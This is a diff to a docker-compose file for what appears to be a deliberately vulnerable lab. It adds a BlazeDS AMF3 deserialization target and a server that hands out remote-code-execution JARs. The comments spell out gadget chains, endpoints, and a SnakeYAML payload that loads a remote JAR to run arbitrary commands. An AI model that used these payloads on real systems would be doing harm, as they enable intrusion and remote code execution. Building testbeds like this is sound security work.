@@ -257,3 +257,56 @@ services:
     labels:
       vuln: "BeanUtils 1.8.3 deser — CB2 gadget chain"
       payload: "jchains_native_cb2"
+
+  # ── BlazeDS 4.7.3 AMF3 deserialization (jchains_blazeds_axis2) ───────────
+  # CVE: Adobe BlazeDS AMF3 arbitrary deserialization
+  # Chain: Axis2MetaDataEntry → CB1 → TemplatesImpl → bytecode exec
+  # Protocol: HTTP POST /messagebroker/amf  (Content-Type: application/x-amf)
+  # java-chains payload name: BlazeDSAMF3AMPayload
+  blazeds:
+    build:
+      context: ./deser-targets
+      dockerfile: Dockerfile.blazeds
+    container_name: vuln-blazeds
+    restart: unless-stopped
+    ports:
+      - "8896:8080"
+    networks:
+      - vulnlab
+    extra_hosts:
+      - "host.docker.internal:host-gateway"
+    environment:
+      PORT: "8080"
+    labels:
+      vuln: "BlazeDS AMF3 RCE"
+      payload: "jchains_blazeds_axis2"
+      endpoint: "POST /messagebroker/amf"
+      gadgets: "CC3.2.1 + CC4.0 + CB1.9.4 + BlazeDS4.7.3"
+
+  # ── SnakeYAML SPI JAR HTTP server (jchains_jndi_snakeyaml) ───────────────
+  # Serves dynamically-generated JARs for SnakeYAML SPI gadget chain.
+  # The chain: !!ScriptEngineManager [!!URLClassLoader [[!!URL ["http://THIS:8099/rce.jar?cmd=CMD"]]]]
+  # When SnakeYAML parses the YAML, URLClassLoader fetches the JAR from this server,
+  # ScriptEngineManager SPI instantiates RceFactory, constructor executes the cmd.
+  #
+  # Endpoint: GET /rce.jar?cmd=<url-encoded-command>
+  # Used by: jchains_jndi_snakeyaml (OOBserver's LDAP server returns SnakeyamlRef
+  #          pointing to this server as the JAR download URL)
+  spi-jar-server:
+    build:
+      context: ./deser-targets/spi-jar-server
+      dockerfile: Dockerfile
+    container_name: vuln-spi-jar-server
+    restart: unless-stopped
+    ports:
+      - "8099:8099"
+    networks:
+      - vulnlab
+    extra_hosts:
+      - "host.docker.internal:host-gateway"
+    environment:
+      PORT: "8099"
+    labels:
+      vuln: "SnakeYAML SPI JAR server"
+      payload: "jchains_jndi_snakeyaml"
+      endpoint: "GET /rce.jar?cmd=<url-encoded-command>"
